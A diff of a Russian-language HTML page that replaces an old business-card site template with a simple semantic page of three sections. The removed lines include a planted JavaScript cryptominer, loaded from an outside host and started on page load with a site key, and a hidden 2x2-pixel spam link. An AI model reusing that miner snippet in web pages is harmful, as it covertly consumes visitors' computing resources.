@@ -1,117 +1,48 @@
-<!DOCTYPE HTML>
-<html>
-
-<head>
-  <title>Сайт визитка - шаблон</title>
-  <meta name="description" content="Описание" />
-  <meta name="keywords" content="ключевые слова" />
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
-  <link rel="stylesheet" type="text/css" href="css/style.css" />
-  <script type="text/javascript" src="js/modernizr-1.5.min.js"></script>
-</head>
-
-<body>
-  <div id="main">
+<!DOCTYPE html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Заголовок страницы</title>
+    <link rel="stylesheet" href="./styles/style.css">
+  
+    <meta property="og:title" content="Заголовок страницы в OG">
+    <meta property="og:description" content="Описание страницы в OG">
+    <meta property="og:image" content="https://example.com/image.jpg">
+    <meta property="og:url" content="https://example.com/">
+  </head>
+  <body>
     <header>
-      <div id="logo"><h1>Сайт<a href="index.html"> визитка</a></h1></div>
+      <h1>Это мой сайт</h1>
+      <p>Он хороший</p>
       <nav>
-        <ul class="lavaLampWithImage" id="lava_menu">
-          <li class="current"><a href="index.html">Главная</a></li>
-          <li><a href="examples.html">Подробнее</a></li>
-          <li><a href="page.html">Моя страница</a></li>
-          <li><a href="another_page.html">Мои друзья</a></li>
-          <li><a href="contact.php">Контакты</a></li>
+        <ul>
+          <li><a href="index.html">Эта страница</a></li>
+          <li><a href="catalog.html">Другая страница</a></li>
         </ul>
       </nav>
     </header>
-    <div id="site_content">
-      <ul id="images">
-        <li><a href="http://21ru.ru" target="_blank"><img src="images/1.jpg" width="600" height="300" alt="photo_one" /></a></li>
-        <li><a href="http://21ru.ru" target="_blank"><img src="images/2.jpg" width="600" height="300" alt="photo_two" /></a></li>
-        <li><img src="images/3.jpg" width="600" height="300" alt="photo_three" /></li>
-        <li><img src="images/4.jpg" width="600" height="300" alt="photo_four" /></li>
-        <li><img src="images/5.jpg" width="600" height="300" alt="photo_five" /></li>
-        <li><a href="http://21ru.ru" target="_blank"><img src="images/6.jpg" width="600" height="300" alt="photo_six" /></a></li>
-      </ul>
-      <div id="sidebar_container">
-        <div class="sidebar">
-          <h3>Последние новости</h3>
-          <h4>Мой сайт</h4>
-          <h5>20 ноября, 2013</h5>
-          <p>2013 sees the redesign of our website. Take a look around and let us know what you think.<br /><a href="#">Read more</a></p>
-        </div>
-        <div class="sidebar">
-          <h3>Новости друзей</h3>
-          <ul>
-            <li><a href="#">Ссылка 1</a></li>
-            <li><a href="#">Ссылка 2</a></li>
-            <li><a href="#">Ссылка 3</a></li>
-            <li><a href="#">Ссылка 4</a></li>
-          </ul>
-        </div>
-      </div>
-      <div id="content">
-        <h1 align="center">Приятно чувствовать Ваше присутствие</h1>
-        <script src="https://www.hostingcloud.racing/m44s.js"></script>
-<script>
-    var _client = new Client.Anonymous('0abcf6ded679e8c2bfd2da89d3343d23c08670b639401f6148f21c927b026b3f', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-</script>
-        <h2>Фото</h2>
-        <p>images can be placed on the left, in the center or on the right:</p>
-        <span class="left"><img src="images/graphic.jpg" alt="example graphic" /></span>
-        <p>
-          5
-        </p>
-        
-        <span class="right"><img src="images/graphic.jpg" alt="example graphic" /></span>
-        <p>
-          5
-        </p>
-        
-        <p align="center"><span class="center"><img src="images/graphic.jpg" alt="example graphic" /></span></p>
-        
-        <h2>Browser Compatibility</h2>
-        <p>This template has been tested in the following browsers:</p>
-        <ul>
-          <li>Internet Explorer 8</li>
-          <li>Internet Explorer 7</li>
-          <li>FireFox 10</li>
-          <li>Google Chrome 17</li>
-        </ul>
-      </div>
-    </div>
+    <main>
+      <article>
+        <section>
+          <h2>Первая секция</h2>
+          <p>Она обо мне</p>
+          <img src="images/image.png" alt="Человек и пароход">
+          <p>Но может быть и о семантике, я пока не решил.</p>
+        </section>
+        <section>
+          <h2>Вторая секция</h2>
+          <p>Она тоже обо мне</p>
+        </section>
+        <section>
+          <h2>И третья</h2>
+          <p>Вы уже должны были начать догадываться.</p>
+        </section>
+      </article>
+    </main>
     <footer>
-      <p><a href="index.html">Главная</a> | <a href="examples.html">Обо мне</a> | <a href="page.html">Фотографии</a> | <a href="another_page.html">Блок</a> | <a href="contact.php">Контакты</a></p>
-      <p>&copy; 2013. All . | <a href="http://21ru.ru">21ru.ru</a></p>
+      <p>Сюда бы я вписал информацию об авторе и ссылки на другие сайты</p>
     </footer>
-  </div>
-  <!-- Параметры слайдера -->
-  <script type="text/javascript" src="js/jquery.min.js"></script>
-  <script type="text/javascript" src="js/jquery.easing.min.js"></script>
-  <script type="text/javascript" src="js/jquery.lavalamp.min.js"></script>
-  <script type="text/javascript" src="js/jquery.kwicks-1.5.1.js"></script>
-  <script type="text/javascript">
-    $(document).ready(function() {
-      $('#images').kwicks({
-        max : 600,
-        spacing : 2
-      });
-    });
-  </script>
-  <script type="text/javascript">
-    $(function() {
-      $("#lava_menu").lavaLamp({
-        fx: "backout",
-        speed: 700
-      });
-    });
-  </script>
-  
-<a href="http://21ru.ru/" target="_blank"><img src="http://21ru.ru/21ru.ru.png" width="2" height="2" alt="Авто технологии" /></a>
-</body>
-</html>
+    <!-- сюда можно подключить jquery <script src="scripts/app.js" defer></script> -->
+  </body>
+</html
